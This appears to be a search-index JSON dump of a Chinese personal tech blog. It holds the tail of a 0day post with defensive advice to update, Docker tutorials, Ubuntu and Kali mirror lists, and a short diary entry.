Defender）并没有阻止我们点击恶意链接，部分安全软件（比如卡巴斯基）在点击含有反弹shell的链接时发出了警告——过度依赖安全软件是不对的，不明链接不要随意点击。 当然，最保险的修复方案还是官方更新啦，直接升级到最新版（3.2.1.141及以后版本）即可 。 及时更新，及时更新，及时更新，重要的事情说三遍（x）","categories":[{"name":"ctf","slug":"ctf","permalink":"https://blog.xiabee.cn/categories/ctf/"}],"tags":[{"name":"0day","slug":"0day","permalink":"https://blog.xiabee.cn/tags/0day/"}]},{"title":"不输入sudo运行Docker","slug":"coding/不输入sudo使用docker","date":"2020-03-19T12:00:23.000Z","updated":"2022-08-13T15:39:31.421Z","comments":true,"path":"posts/docker-sudo/","link":"","permalink":"https://blog.xiabee.cn/posts/docker-sudo/","excerpt":"","text":"docker对权限要求较高，需要sudo权限才能运行，但是每次敲命令都加sudo就显得很累赘，这里有个化简办法：将用户加入docker组，实现不加sudo执行docker命令 查看docker组查看/etc/group,确定是否存在docker组 1cat /etc/group | grep docker 安装Docker后，docker组已经创建好了，所以上面命令的输出为： docker:x:120:ubuntu 将当前用户添加到 docker 组1sudo gpasswd -a $&#123;USER&#125; docker 重新登录或切换到docker组12345newgrp - docker# 切换到docker组sudo service docker restart# 重启服务 检查效果 不加sudo直接执行docker命令检查效果：docker images 执行成功，妈妈再也不用担心我敲 sudo 啦","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://blog.xiabee.cn/tags/docker/"}]},{"title":"Docker常用命令","slug":"coding/docker常用命令","date":"2020-03-18T12:00:23.000Z","updated":"2022-08-13T15:39:31.418Z","comments":true,"path":"posts/docker-commands/","link":"","permalink":"https://blog.xiabee.cn/posts/docker-commands/","excerpt":"","text":"运行docker时，发现权限不足可以康康这个：不输入sudo运行docker 1.查看docker容器信息123docker --help #查看docker容器帮助docker version #查看docker容器版本docker info #查看docker容器信息 2.镜像查看1234567docker images #列出本地imagesdocker images -a #含中间映像层docker images -q #只显示镜像IDdocker images -qa #含中间映像层 docker images --digests ##显示镜像摘要信息(DIGEST列)docker images --no-trunc ##显示镜像完整信息 3.镜像搜索12345docker search wordpress #搜索wordpress镜像docker search --filter=stars=20 wordpress #只显示stars大于等于20的镜像docker search --no-trunc wordpress #显示镜像完整 DESCRIPTION 描述docker search --automated wordpress #只显示AUTOMATED=OK 的镜像 4.镜像下载1234docker pull wordpress #下载官方最新镜像，相当于 docker pull wordpress:latestdocker pull wordpress:latest #按照tag下载镜像，这里的tag是latestdocker pull -a wordpress #下载全部wordpress镜像docker pull xxxx/wordpress #下载私人仓库镜像 如果 pull 过慢可以参考这篇博客：docker下载过慢：换源 5.镜像删除123456docker rmi wordpress #相当于docker rmi wordpress:latestdocker rmi wordpress:latest #指定tag删除，单个删除docker rmi -f wordpress #强制删除，针对基于镜像有运行的容器进程docker rmi -f wordpresss tomcat nginx #多镜像删除，不同镜像间以空格间隔docker rmi -f $(docker images -q) #本地镜像全部删除 6.镜像构建1234cd /docker/dockerfile ##编写dockerfilevim mydockerxxxxxxxx ##编写dockerfiledocker build -f /docker/dockerfile/mydocker -t mymydocker:1.1 ##构建docker镜像 7.容器启动12345docker run -i -t --name wordpress##新建并启动容器，参数：-i 以交互模式运行容器；-t 为容器重新分配一个伪输入终端；--name 为容器指定一个名称docker run -d wordpress##后台启动容器，参数：-d 已守护方式启动容器 8.容器查看123456789101112131415docker ps ##查看正在运行的容器docker ps -q ##查看正在运行的容器的IDdocker ps -a ##查看正在运行+历史运行过的容器docker ps -s ##显示运行容器总文件大小docker ps -l ##显示最近创建容器docker ps -n 3 ##显示最近创建的3个容器 docker ps --no-trunc ##不截断输出docker inspect wordpress ##获取镜像wordpress的元信息docker inspect --format=&#x27;&#123;&#123;range .NetworkSettings.Networks&#125;&#125;&#123;&#123;.IPAddress&#125;&#125;&#123;&#123;end&#125;&#125;&#x27; wordpress##获取正在运行的容器wordpress的 IP 注意：直接使用名称可能会找不到容器，建议直接使用容器ID进行容器操作 9.容器日志123456789docker logs xxxxx##查看xxxxxx容器日志，默认参数docker logs -f -t --tail=20 wordpress##查看wordpress容器日志，参数：-f 跟踪日志输出；-t 显示时间戳；--tail 仅列出最新N条容器日志；docker logs --since=&quot;2019-05-21&quot; --tail=10 wordpress##查看容器wordpress从2019年05月21日后的最新10条日志。 docker logs 2968994e3fb2 --since=&quot;2019-05-21&quot; --tail=10，这里直接使用了容器ID 10.容器的进入与退出1234567891011121314151617docker run -it centos /bin/bash##使用run方式在创建时进入exit##关闭容器并退出docker attach --sig-proxy=false centos ##直接进入centos 容器启动命令的终端，不会启动新进程，多个attach连接共享容器屏幕，参数：--sig-proxy=false 确保CTRL-D或CTRL-C不会关闭容器docker exec -i -t centos /bin/bash##在 centos 容器中打开新的交互模式终端，可以启动新进程，参数：-i 即使没有附加也保持STDIN 打开；-t 分配一个伪终端docker exec -i -t centos ls -l /tmp##以交互模式在容器中执行命令，结果返回到当前终端屏幕docker exec -d centos touch cache.txt ##以分离模式在容器中执行命令，程序后台运行，结果不会反馈到当前终端 这里同样建议通过ID进入容器 11.容器的停止与删除12345678910docker stop wordpres ##停止一个运行中的容器docker kill wordpres ##干掉一个运行中的容器docker rm wordpres ##删除一个已停止的容器docker rm -f wordpres ##删除一个运行中的容器docker rm -f $(docker ps -a -q) docker ps -a -q | xargs docker rm ##删除多个容器docker rm -l db ## -l 移除容器间的网络连接，连接名为 dbdocker rm -v wordpres ## -v 删除容器，并删除容器挂载的数据卷 12.生成镜像12docker commit -a=&quot;DeepInThought&quot; -m=&quot;my wordpres&quot; [wordpres容器ID] mywordpres:v1.1##基于当前wordpres容器创建一个新的镜像；参数：-a 提交的镜像作者；-c 使用Dockerfile指令来创建镜像；-m :提交时的说明文字；-p :在commit时，将容器暂停 13.容器与宿主机间的数据拷贝12345678docker cp rabbitmq:/[container_path] [local_path]##将rabbitmq容器中的文件copy至本地路径docker cp [local_path] rabbitmq:/[container_path]/##将主机文件copy至rabbitmq容器docker cp [local_path] rabbitmq:/[container_path]##将主机文件copy至rabbitmq容器，目录重命名为[container_path]（注意与非重命名copy的区别） docker常用命令大致就这些，看起来很多，实际上掌握基本的拖取、运行、查看日志等操作后基本能满足日常使用需求 今天就先分享到这里，下次有空再更（划掉）","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://blog.xiabee.cn/tags/docker/"}]},{"title":"Docker换源","slug":"coding/docker换源","date":"2020-03-17T12:10:23.000Z","updated":"2022-08-13T15:39:31.418Z","comments":true,"path":"posts/docker-source/","link":"","permalink":"https://blog.xiabee.cn/posts/docker-source/","excerpt":"","text":"Docker相关 Docker入门 Docker常用命令 Docker解决sudo Docker换源由于众所周知的原因，国内的访问docker源时会比较慢，所以我们换源到国内镜像站上。 这里依然以Ubuntu为例。 腾讯源 官方文档 具体操作： 创建加速器文件 12/etc/docker/daemon.jsonvim /etc/docker/daemon.json 按i切换至编辑模式，在daemon.json中添加以下内容，并保存（ESC；输入:进入命令模式；q保存并退出） 12345&#123;&quot;registry-mirrors&quot;: [ &quot;https://mirror.ccs.tencentyun.com&quot;]&#125; 重启 Docker 1sudo service restart docker 阿里源阿里源需要注册账号才能加速。 官网教程 注册/登录后可以得到一个加速器地址 将加速器地址填入下面的registry-mirrors中： 123456789sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;&#123; &quot;registry-mirrors&quot;: [&quot;https://xxxxx.mirror.aliyuncs.com&quot;]&#125;EOF# 创建加速器文件sudo systemctl daemon-reloadsudo systemctl restart docker 清华源 官方文档 其他源按前面腾讯源/阿里源的换源方法，把下面地址添加到/etc/docker/daemon.json中： 12345678## Docker中国区官方镜像https://registry.docker-cn.com## 网易http://hub-mirror.c.163.com## ustc https://docker.mirrors.ustc.edu.cn 12sudo systemctl daemon-reloadsudo systemctl restart docker","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://blog.xiabee.cn/tags/docker/"}]},{"title":"Docker入门","slug":"coding/docker入门","date":"2020-03-17T12:00:23.000Z","updated":"2022-08-13T15:39:31.417Z","comments":true,"path":"posts/docker-pupy/","link":"","permalink":"https://blog.xiabee.cn/posts/docker-pupy/","excerpt":"","text":"Docker简介 官方文档 简言之：开源的、跨平台的、虚拟化的应用引擎；使用沙箱机制。 一个完整的Docker通常会包括以下几个部分： DockerClient 客户端 Docker Daemon守护进程 Docker Image镜像 DockerContainer容器 Docker与VM可能很多朋友都用过虚拟机，而对容器这个概念比较的陌生——简单来说，可以理解为：相较于VM，docker是轻量级的虚拟化技术，却有着更强大的性能。 虚拟机（VM） 我们用的传统虚拟机如 VMware ， virtualbox之类的需要模拟整台机器包括硬件。 每台虚拟机都需要有自己的操作系统，虚拟机一旦被开启，预分配给它的资源将全部被占用。 每一台虚拟机包括应用，必要的二进制和库，以及一个完整的用户操作系统。 容器（docker/Container） 容器技术是和我们的宿主机共享硬件资源及操作系统，可以实现资源的动态分配。 容器包含应用和其所有的依赖包，但是与其他容器共享内核。容器在宿主机操作系统中，在用户空间以分离的进程运行。 容器技术是实现操作系统虚拟化的一种途径，可以让您在资源受到隔离的进程中运行应用程序及其依赖关系。 通过使用容器，我们可以轻松打包应用程序的代码、配置和依赖关系，将其变成容易使用的构建块，从而实现环境一致性、运营效率、开发人员生产力和版本控制等诸多目标。 容器可以帮助保证应用程序快速、可靠、一致地部署，其间不受部署环境的影响。 容器还赋予我们对资源更多的精细化控制能力，让我们的基础设施效率更高。 一张图展示Docker和VM的区别： 左图为dokcer，右图为VM Docker安装 docker分社区版和企业版，这里我们选择社区版（因为企业版要钱） 官方文档中各大环境的安装说明： https://docs.docker.com/install/ 包管理器安装这里我们以Ubuntu为例： 正常的话用包管理器就装完了： 123sudo apt updatesudo apt install docker sudo apt install docker.io 其他安装 参考知乎等教程 检测版本1docker -v 得到这种显示则说明安装成功： Docker换源 参考这篇博客 docker-compose 官网 用于编排容器，具体教程以后再写（x） 1sudo apt install docker-compose 关于其他 常用命令可以参考这篇博客：docker常用命令 运行docker时发现权限不足可以康康这个：不输入sudo运行docker","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://blog.xiabee.cn/tags/docker/"}]},{"title":"Ubuntu/kali 国内各大更新源","slug":"coding/Ubuntu kali国内各大更新源","date":"2020-03-14T12:00:23.000Z","updated":"2022-08-13T15:39:31.415Z","comments":true,"path":"posts/linux-sources/","link":"","permalink":"https://blog.xiabee.cn/posts/linux-sources/","excerpt":"","text":"修改sources.list: vim /etc/apt/sources.list 改完记得 apt update 一下 kali：官方源12deb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib 中科大123# 中科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib 阿里云123# 阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib 清华源123# THUdeb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free 浙大源12deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freedeb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free 东软大学12deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contribdeb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib 网易源12345678deb http://mirrors.163.com/debian/ jessie main non-free contribdeb http://mirrors.163.com/debian/ jessie-updates main non-free contribdeb http://mirrors.163.com/debian/ jessie-backports main non-free contribdeb-src http://mirrors.163.com/debian/ jessie main non-free contribdeb-src http://mirrors.163.com/debian/ jessie-updates main non-free contribdeb-src http://mirrors.163.com/debian/ jessie-backports main non-free contribdeb http://mirrors.163.com/debian-security/ jessie/updates main non-free contribdeb-src http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib Ubuntu阿里源 官方地址 1234567891011#阿里源deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse 中科大源1234567891011##中科大源deb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse 清华源1234567891011## THU deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse 网易源123456789101112##163源deb http://mirrors.163.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://blog.xiabee.cn/tags/linux/"}]},{"title":"碎碎念","slug":"informal-essay/碎碎念","date":"2020-03-10T12:00:23.000Z","updated":"2022-08-13T15:39:31.427Z","comments":true,"path":"posts/ababa/","link":"","permalink":"https://blog.xiabee.cn/posts/ababa/","excerpt":"","text":"信安作品赛初赛留的天坑……补是补不完了，摸又不敢摸 2021/7/15 英语好难，从高三水平退步到大三水平（ 2021/4/6 永远感觉时间不够用，入党、必修课、竞赛、考研全部堆一起.jpg 2021/3/29 摸鱼一时爽，实验火葬场 2021/3/16 往高处走的时候，peer presure真的会指数增大 2020/10/26 谢谢你，终于让自己属于我自己 2020/10/4 有时候，有些事，需要一点点运气 2020/8/2 果断，就会白给 2020/7/15 犹豫，就会败北 2020/6/13 XIAO氏xiabee，性巨皮，好游戏，六艺经传皆不会…… 2020/3/17","categories":[{"name":"informal essay","slug":"informal-essay","permalink":"https://blog.xiabee.cn/categories/informal-essay/"}],"tags":[{"name":"碎碎念","slug":"碎碎念","permalink":"https://blog.xiabee.cn/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}]}],"categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"},{"name":"informal essay","slug":"informal-essay","permalink":"https://blog.xiabee.cn/categories/informal-essay/"},{"name":"friends","slug":"friends","permalink":"https://blog.xiabee.cn/categories/friends/"},{"name":"blockchain","slug":"blockchain","permalink":"https://blog.xiabee.cn/categories/blockchain/"},{"name":"ctf","slug":"ctf","permalink":"https://blog.xiabee.cn/categories/ctf/"}],"tags":[{"name":"serverless","slug":"serverless","permalink":"https://blog.xiabee.cn/tags/serverless/"},{"name":"glados","slug":"glados","permalink":"https://blog.xiabee.cn/tags/glados/"},{"name":"mac","slug":"mac","permalink":"https://blog.xiabee.cn/tags/mac/"},{"name":"ctf","slug":"ctf","permalink":"https://blog.xiabee.cn/tags/ctf/"},{"name":"brew","slug":"brew","permalink":"https://blog.xiabee.cn/tags/brew/"},{"name":"linux","slug":"linux","permalink":"https://blog.xiabee.cn/tags/linux/"},{"name":"hexo","slug":"hexo","permalink":"https://blog.xiabee.cn/tags/hexo/"},{"name":"algolia","slug":"algolia","permalink":"https://blog.xiabee.cn/tags/algolia/"},{"name":"tidb","slug":"tidb","permalink":"https://blog.xiabee.cn/tags/tidb/"},{"name":"oj","slug":"oj","permalink":"https://blog.xiabee.cn/tags/oj/"},{"name":"docker","slug":"docker","permalink":"https://blog.xiabee.cn/tags/docker/"},{"name":"postal","slug":"postal","permalink":"https://blog.xiabee.cn/tags/postal/"},{"name":"docker-compose","slug":"docker-compose","permalink":"https://blog.xiabee.cn/tags/docker-compose/"},{"name":"vps","slug":"vps","permalink":"https://blog.xiabee.cn/tags/vps/"},{"name":"碎碎念","slug":"碎碎念","permalink":"https://blog.xiabee.cn/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"},{"name":"nextcloud","slug":"nextcloud","permalink":"https://blog.xiabee.cn/tags/nextcloud/"},{"name":"wordpress","slug":"wordpress","permalink":"https://blog.xiabee.cn/tags/wordpress/"},{"name":"markdown","slug":"markdown","permalink":"https://blog.xiabee.cn/tags/markdown/"},{"name":"utteranc","slug":"utteranc","permalink":"https://blog.xiabee.cn/tags/utteranc/"},{"name":"git","slug":"git","permalink":"https://blog.xiabee.cn/tags/git/"},{"name":"archer","slug":"archer","permalink":"https://blog.xiabee.cn/tags/archer/"},{"name":"friends","slug":"friends","permalink":"https://blog.xiabee.cn/tags/friends/"},{"name":"blockchain","slug":"blockchain","permalink":"https://blog.xiabee.cn/tags/blockchain/"},{"name":"smart contract","slug":"smart-contract","permalink":"https://blog.xiabee.cn/tags/smart-contract/"},{"name":"wsl","slug":"wsl","permalink":"https://blog.xiabee.cn/tags/wsl/"},{"name":"ssh","slug":"ssh","permalink":"https://blog.xiabee.cn/tags/ssh/"},{"name":"0day","slug":"0day","permalink":"https://blog.xiabee.cn/tags/0day/"}]}